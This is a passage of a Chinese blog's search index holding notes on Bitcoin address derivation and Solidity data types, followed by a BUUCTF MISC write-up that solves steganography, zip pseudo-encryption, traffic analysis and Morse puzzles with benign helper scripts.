哈希值，得到：</p><p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p><p>第七步：取上一步结果的前4个字节（8位十六进制）</p><p>869ac57b</p><p>第八步：把这4个字节加在第五步的结果后面</p><p>作为校验位，将这4个字节加载第五步的结果后面，这就是比特币地址的16进制形态了：</p><p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p><p>第九步：用Base58编码变换一下地址</p><p>对上一步的结果进行Base58编码，得到：</p><p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p><p>这就是我们经常看到的传统意义上的比特币钱包地址</p><h1 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h1><p>智能合约的开发，主要使用Solidity编译语言以及在线的Remix编译器</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>有符号整数类型包括int8、int16、int32、int64等，而无符号整数类型包括uint8、uint16、uint32、uint64等。这些类型表示不同位数的整数。</p><p>相较于C语言，保留了大部分运算，增加了乘方(**)运算以及更改了”&lt;&lt;””&gt;&gt;”的运算规则</p><pre><code class="highlight plaintext">x&lt;&lt;y  相当于x*2**y   x&gt;&gt;y相当于x/2**y</code></pre><h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>即bool类型，会在内置函数中大量出现，默认值为false</p><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>用<strong>address</strong>来声明，长度为20位，表示以太坊网络上的账户地址</p><p>在地址型下有**transfer(转账)<strong>与</strong>balance(账户)**两个变量</p><p>通过以下函数来处理地址类型（关于Gas的概念，请见<strong>交易处理</strong>板块）</p><pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) ——&gt;返回以wei为单位的该地址的以太币账户（1ETH=10^18wei）</code></pre><pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）</code></pre><p>余额不足，Gas不足时会使合约无法执行，回滚已执行的程序并且发送异常信息（<strong>交易被终止</strong>）</p><pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）在交易成功或失败后会返回对应的bool值</code></pre><p>余额不足，Gas不足时会终止程序但不会发送异常消息，会返回False</p><p>但使用.send是存在一定风险的，可能会导致转账失败(调用的堆栈&gt;1024KB或发出方的Gas耗尽)的情况下交易的对方仍能收到以太币</p><pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) ——&gt;最常用的调用函数，失败返回false,Gas的费用可自己调整。</code></pre><p>发布低级别的调用</p><p>call()下有两个控制交易的内置函数</p><p>gas()(支付的Gas值)与value()(支付的以太币值)，两者同时调用没有先后顺序的要求</p><pre><code class="highlight plaintext">例如：address.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre><pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre><p>发布低级别的调用，没call好用，不久就会被删除了</p><pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre><p>发布低级别的代表调用,调用的是储存在另一个库中的库代码(Library code)</p><p>？故使用前要确定两个合约的储存设计都要适用于该函数？</p><blockquote><p>[!WARNING]</p><p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>都是低阶函数，使用时调用的未知合约可能是恶意合约，在调用是可能会被篡权，反过来被调用合约，因此调用函数返回时要注意原合约的参数是否已经被改变</p></blockquote><blockquote><p>地址常量</p></blockquote><p>​</p><h3 id="字节数组"><a href="#字节数组" class="headerlink" title="字节数组"></a>字节数组</h3><p>分为<strong>固定长度的字节数组</strong>以及<strong>可变长度的字节数组</strong></p><p>固定长度的数组可以用bytes1~bytes32来说明(bytes1也可以直接记作byte)</p><p>可以通过索引访问以及[变量名].length返回字节长度</p><p>可变长度的数组：</p><p>①bytes(与array性质相同)</p><p>②string(可以理解为特殊的数组)，不可以调用.length&#x2F;索引来访问</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU—MISC刷题记录</title>
      <link href="/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p><h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p><p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p><p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p><p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p><p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p><p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p><h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p><p>主要是HTTP流量，直接追踪流</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p><p>用<code>captfencoder</code>MD5一下结束战斗</p><p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p><h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p><p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p><p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p><h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p><p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p><p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p><p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p><h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p><p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p><p>查完没有藏文件，那应该就是隐写了</p><p>结果没有发现隐写，感觉被骗了</p><p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p><p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p><h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p><p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p><p>成功了，打开提取的文件发现有PK头</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p><p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p><p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p><p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p><h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p><p>foremost出一下，要密码，先尝试弱密码爆破</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p><p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p><h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p><p>看来是改了后缀，010先查查看</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p><p>演都不演了…</p><h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p><p>盯完帧没有东西，看看副本，发现已经损坏</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p><p>（这里-其实是_）</p><h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p><p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p><p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p><p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p><p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p><p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p><blockquote><p>[!NOTE]</p><p>以下为对题目考察的不是明文攻击的验证，可以跳过</p></blockquote><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p><p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p><p>这里我们用ubuntu查，使用<code>crc32</code>命令</p><pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perlcrc32 flag.jpg</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p><p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p><p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p><p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p><p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p><pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p><p>水平有限，还是手敲罢</p><pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p><p>鉴定为图片纯纯的诈骗（恼</p><h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p><p>要画图，那么应该藏了坐标，010查一下</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p><p>可以看到文件尾藏了一种数据，接下来有两种方法</p><blockquote><p>随波逐流</p></blockquote><p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p><p>这个时候用<code>stegsolve</code>反色再扫就出来了</p><blockquote><p>脚本画图</p></blockquote><p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p><p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p><p>​<code>*gnuplot*</code>绘图</p><p>贴个脚本先</p><pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)    re = res.read()    res.close()    with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt    re = re.split()    tem = &#x27;&#x27;    for i in range(0, len(re)):        tem = re[i]        tem = tem.lstrip(&#x27;(&#x27;)        tem = tem.rstrip(&#x27;)&#x27;)        for j in range(0, len(tem)):            if tem[j] == &#x27;,&#x27;:                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]        gnup.write(tem + &#x27;\n&#x27;)    gnup.close()</code></pre><p>得到去括号，去逗号的坐标值</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p><p>贴一下ubuntu下的下载和使用方法</p><pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11gnuplotplot <span class="string">&quot;output.txt&quot;</span></code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p><p>可以扫出来</p><p>​<em>matplotlib</em>绘图</p><p>把原文本去括号，用脚本跑</p><pre><code class="highlight plaintext">import matplotlib.pyplot as pltimport numpy as npwith open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:    re = res.read()    res.close()with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt    re = re.split()    tem = &#x27;&#x27;    for i in range(0, len(re)):        tem = re[i]        tem = tem.lstrip(&#x27;(&#x27;)        tem = tem.rstrip(&#x27;)&#x27;)        gnup.write(tem + &#x27;\n&#x27;)    gnup.close()x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)plt.plot(x, y, &#x27;.&#x27;)plt.show()</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
